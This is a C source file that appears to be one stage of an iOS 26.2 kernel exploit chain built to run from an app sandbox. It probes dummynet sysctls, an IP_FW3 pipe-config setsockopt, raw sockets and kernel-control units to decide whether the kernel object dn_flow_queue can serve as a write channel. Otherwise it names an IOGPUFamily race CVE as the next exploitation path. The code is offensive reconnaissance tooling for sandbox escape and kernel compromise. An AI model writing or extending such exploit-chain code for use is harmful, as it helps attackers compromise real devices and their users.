// language: C, file: dummynet_probe.c, target: iOS 26.2 / 23C55 / arm64e, Theos app sandbox
// T2 Job 3 — dummynet/ipfw reachability probe. THE GATE for dn_flow_queue
// (the SILVER write-channel neighbour): dn_flow_queue only allocates when a
// pipe/queue exists in the packet path (ip_dummynet.c sites). If no sandbox
// path can create a pipe/queue, dn_flow_queue is DEAD and the write channel
// collapses to the four unscored IOKit neighbours.
//
// Facts anchoring the probe surface (all read this session):
//   - the device KC strings carry DUMMYNET_PIPE_CONFIG / DUMMYNET_RULE_CONFIG /
//     DUMMYNET_NLC_DISABLED -> dummynet is compiled into 23C55.
//   - XNU 61.12 exports the SYSCTL_NODE net.inet.ip.dummynet.* family
//     (bsd/netinet/ip_dummynet.c:210): hash_size, curr_time, ready_heap,
//     extract_heap, searches, search_steps, expire, max_chain_len,
//     red_lookup_depth, red_avg_pkt_size, debug.
//   - ipfw user-facing strings: NONE in the KC (no ipfw3 socket API shipped).
//   - the DUMMYNET_* event codes are kdebug telemetry, not config.
// The probe therefore tests: (1) the sysctl family exists/writable,
// (2) the classic FreeBSD dummynet config entry (IP_FW3 getsockopt cookie),
// (3) PF_SYSTEM kernel-control surface for a dummynet control unit,
// (4) raw-socket posture (blocks the packet-path alternative outright).

#include "exploit.h"
#include <sys/sysctl.h>
#include <sys/socket.h>
#include <sys/sockio.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>

/* sys/kern_control.h is not present in the iPhoneOS16.5 SDK headers: declare the
 * pieces from XNU source (bsd/sys/kern_control.h): MAX_KCTL_NAME=96,
 * struct ctl_info { u_int32_t ctl_id; char ctl_name[96]; },
 * CTLIOCGINFO = _IOWR('N', 51, struct ctl_info). */
#define T2_SYSPROTO_CONTROL 2   /* SYSPROTO_CONTROL, from XNU bsd/sys/kern_control.h */
#define T2_MAX_KCTL_NAME 96
#define T2_CTLIOCGINFO    0xc0644e33  /* _IOWR('N', 51, sizeof(struct ctl_info)=100) */
struct t2_ctl_info {
    uint32_t ctl_id;
    char     ctl_name[T2_MAX_KCTL_NAME];
};

/* classic FreeBSD ipfw3 dummynet config options (for the EOPNOTSUPP probe) */
#ifndef IPPROTO_IP
#define IPPROTO_IP 0
#endif
#ifndef IP_FW3
#define IP_FW3 21   /* legacy value; if shipped, setsockopt misbehaves anyway */
#endif

static const char *en(int e)
{
    switch (e) {
    case 0:       return "OK";
    case EPERM:   return "EPERM";
    case EACCES:  return "EACCES";
    case ENOENT:  return "ENOENT(absent)";
    case EOPNOTSUPP: return "EOPNOTSUPP";
    case EINVAL:  return "EINVAL(reached subsystem)";
    case ENOBUFS: return "ENOBUFS(reached subsystem)";
    case EFAULT:  return "EFAULT";
    case ENOMEM:  return "ENOMEM";
    default:      return "OTHER";
    }
}

static int probe_sysctl(const char *name, int writeval)
{
    int v = 0; size_t l = sizeof(v);
    int r = sysctlbyname(name, &v, &l, writeval ? &writeval : NULL, writeval ? sizeof(writeval) : 0);
    int e = (r == 0) ? 0 : errno;
    nk_logx("DN", "sysctl %-38s r=%d errno=%d %s", name, r, e, en(e));
    return r == 0 ? 0 : e;
}

int nk_t2_dummynet_probe(void)
{
    nk_crash_guard_install(NULL); /* app-launch guard already active; re-assert */
    nk_rule();
    nk_log("[DN] dummynet reachability probe (gate for dn_flow_queue SILVER neighbour)");

    static const char *oids[] = {
        "net.inet.ip.dummynet.debug",
        "net.inet.ip.dummynet.expire",
        "net.inet.ip.dummynet.max_chain_len",
        "net.inet.ip.dummynet.hash_size",
        "net.inet.ip.dummynet.searches",
        "net.inet.ipfw.debug",
        "net.inet.ip.fw.enable",
        "net.inet.ip.dummynet.opmode",  /* not in 61.12 OID list: expected ENOENT */
    };
    int reached = 0, eperm = 0, absent = 0;
    /* R20 gate counters: ONLY the pipe-config attempt may move these */
    int cfg_reached = 0, cfg_eperm = 0, cfg_eopnotsupp = 0;
    char cfg_detail[64] = "";

    for (size_t i = 0; i < sizeof(oids) / sizeof(oids[0]); i++) {
        int e = probe_sysctl(oids[i], 0);
        if (e == 0 || e == EINVAL || e == ENOBUFS) reached++;
        else if (e == EPERM || e == EACCES) eperm++;
        else if (e == ENOENT) absent++;
        /* write attempt on the debug knob (CTLFLAG_LOCKED expected) */
        if (i == 0) (void)probe_sysctl(oids[i], 1);
    }

    /* (2) classic FreeBSD ipfw3 config cookie via getsockopt/setsockopt */
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (s < 0) {
        nk_logx("DN", "socket(AF_INET,SOCK_DGRAM) errno=%d %s", errno, en(errno));
    } else {
        uint8_t blob[32]; socklen_t bl = sizeof(blob);
        int r = getsockopt(s, IPPROTO_IP, IP_FW3, blob, &bl);
        nk_logx("DN", "getsockopt(IP_FW3) r=%d errno=%d %s", r, errno, en(errno));

        /* (2b) THE R20 GATE: an actual pipe-config attempt. Reading the OIDs
         * proves nothing about allocation: dn_flow_queue is allocated only
         * when a dummynet pipe/queue exists in the packet path, which requires
         * a config write through the ipfw/dummynet user API. Build a minimal
         * dn_sess pipe header (ip_dummynet.h: direction + pipe_nr + bucket
         * sizing) and try setsockopt: eng ged subsystem = non-permission
         * error; EPERM/EACCES = sandbox blocks config = dn_flow_queue DEAD. */
        uint32_t pipecfg[8];
        memset(pipecfg, 0, sizeof(pipecfg));
        pipecfg[0] = 1;        /* direction: DN_TO_IP/DN_TO_IF side */
        pipecfg[1] = 1;        /* pipe_nr */
        pipecfg[2] = 0x00010000; /* bucket_step = 64KB (power of two) */
        pipecfg[3] = 64;       /* bucket_step size exponent hint */
        int pr = setsockopt(s, IPPROTO_IP, IP_FW3, pipecfg, sizeof(pipecfg));
        int pr_err = errno;
        nk_logx("DN", "setsockopt(IP_FW3 pipe-config) r=%d errno=%d %s  <== R20 GATE",
                pr, pr_err, en(pr_err));
        /* OPTION MATRIX: is the R20 error IP_FW3-specific or the build's
         * generic unknown-option error? 61.12 ip_ctloutput answers
         * ENOPROTOOPT for unknown options, but per-build is law (R8).
         *   A: IP_TTL  len 4  -> known int option
         *   B: opt 250 len 32 -> definitely unhandled control
         *   C: IP_FW3  len 4  -> int-sized cookie, different struct length
         * errno is shared state: capture each result immediately. */
        int one = 63;
        int ra = setsockopt(s, IPPROTO_IP, IP_TTL, &one, sizeof(one));
        int ra_err = errno;
        nk_logx("DN", "matrix A setsockopt(IP_TTL,len4)   r=%d errno=%d %s", ra, ra_err, en(ra_err));
        uint32_t junk[8]; memset(junk, 0, sizeof(junk));
        int rb = setsockopt(s, IPPROTO_IP, 250, junk, sizeof(junk));
        int rb_err = errno;
        nk_logx("DN", "matrix B setsockopt(opt=250,len32) r=%d errno=%d %s  <== control", rb, rb_err, en(rb_err));
        int rc = setsockopt(s, IPPROTO_IP, IP_FW3, &one, sizeof(one));
        int rc_err = errno;
        nk_logx("DN", "matrix C setsockopt(IP_FW3,len4)   r=%d errno=%d %s", rc, rc_err, en(rc_err));
        int fw3_matches_control = (pr == rb && pr_err == rb_err && rc == rb && rc_err == rb_err);
        nk_logx("DN", "matrix digest: A=%d/%d B=%d/%d C=%d/%d -> IP_FW3 %s",
                ra, ra_err, rb, rb_err, rc, rc_err,
                fw3_matches_control ? "MATCHES control (generic rejection, no handler)" :
                                      "DIFFERS from control (handler consumed option 21)");

        int cfg_err = (pr == 0) ? 0 : pr_err;
        if (pr == 0) {
            cfg_reached++; snprintf(cfg_detail, sizeof(cfg_detail), "OK");
        } else if (fw3_matches_control) {
            /* identical to the bogus control: the build answered generically;
             * option 21 has no ipfw/dummynet handler -> no config surface */
            cfg_eopnotsupp++; snprintf(cfg_detail, sizeof(cfg_detail), "generic-%d", cfg_err);
        } else if (cfg_err == EINVAL || cfg_err == ENOBUFS) {
            /* the kernel distinguished option 21 and validated our struct:
             * the ipfw/dummynet config path exists and spoke back */
            cfg_reached++; snprintf(cfg_detail, sizeof(cfg_detail), "EINVAL-distinguished");
        } else if (cfg_err == EPERM || cfg_err == EACCES) {
            cfg_eperm++; snprintf(cfg_detail, sizeof(cfg_detail), "%d", cfg_err);
        } else if (cfg_err == EOPNOTSUPP || cfg_err == ENOPROTOOPT) {
            cfg_eopnotsupp++; snprintf(cfg_detail, sizeof(cfg_detail), "%d", cfg_err);
        } else {
            cfg_eopnotsupp++; snprintf(cfg_detail, sizeof(cfg_detail), "%d(uncertain)", cfg_err);
        }
        close(s);
    }
    int rs = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (rs < 0) {
        nk_logx("DN", "socket(AF_INET,SOCK_RAW,IPPROTO_RAW) errno=%d %s (raw-socket posture)", errno, en(errno));
    } else {
        nk_logx("DN", "socket(AF_INET,SOCK_RAW) OK fd=%d", rs);
        close(rs);
    }
    /* (2c) ipfw enable knob write: writable != pipe config, but a locked
     * knob is independent evidence of the sandbox posture */
    {
        int one = 1;
        int v = 0; size_t l = sizeof(v);
        int wr = sysctlbyname("net.inet.ip.fw.enable", &v, &l, &one, sizeof(one));
        int e = (wr == 0) ? 0 : errno;
        nk_logx("DN", "sysctl write %-36s r=%d errno=%d %s", "net.inet.ip.fw.enable", wr, e, en(e));
        if (wr == 0) { int offw = 0; sysctlbyname("net.inet.ip.fw.enable", &v, &l, &offw, sizeof(offw)); }
    }

    /* (3) PF_SYSTEM control surface: scan units for any dummynet control */
    for (unsigned unit = 0; unit < 4; unit++) {
        int cs = socket(PF_SYSTEM, SOCK_DGRAM, T2_SYSPROTO_CONTROL);
        if (cs < 0) {
            nk_logx("DN", "PF_SYSTEM control socket errno=%d %s", errno, en(errno));
            break;
        }
        struct t2_ctl_info ci;
        memset(&ci, 0, sizeof(ci));
        /* dummynet control names unknown at probe time; enumerate by name */
        snprintf(ci.ctl_name, sizeof(ci.ctl_name), "com.apple.dummynet%u", unit);
        int r = ioctl(cs, T2_CTLIOCGINFO, &ci);
        nk_logx("DN", "ctl %-28s unit=%u ioctl r=%d errno=%d %s id=0x%x",
                ci.ctl_name, unit, r, errno, en(errno), ci.ctl_id);
        close(cs);
    }

    nk_log("[DN] sysctl posture (informational, NOT the gate): reached=%d eperm=%d absent=%d",
           reached, eperm, absent);
    if (cfg_reached > 0) {
        nk_log("[DN] VERDICT: [REACHABLE] — pipe-config path engaged (errno %s); "
               "dn_flow_queue stays SILVER; proceed to T2 dn_flow_queue fingerprint",
               cfg_detail[0] ? cfg_detail : "");
    } else if (cfg_eperm > 0) {
        nk_log("[DN] VERDICT: [DEAD-FROM-SANDBOX] — pipe config returns EPERM/EACCES "
               "(errno %s). dn_flow_queue is DEAD. R20: B12 has no write channel; "
               "promote T6b (CVE-2026-43743 IOGPUFamily race) to critical path",
               cfg_detail[0] ? cfg_detail : "");
    } else if (cfg_eopnotsupp > 0) {
        nk_log("[DN] VERDICT: [NOT-SHIPPED-REACHABLE] — no ipfw/dummynet user config API "
               "in 23C55 (errno %s). dn_flow_queue allocation has no trigger from "
               "userspace; report as no-config-surface", cfg_detail);
    } else {
        nk_log("[DN] VERDICT: INCONCLUSIVE — config attempt neither engaged nor refused; "
               "raw errno list required before any branch decision");
    }
    nk_rule();
    return 0;
}
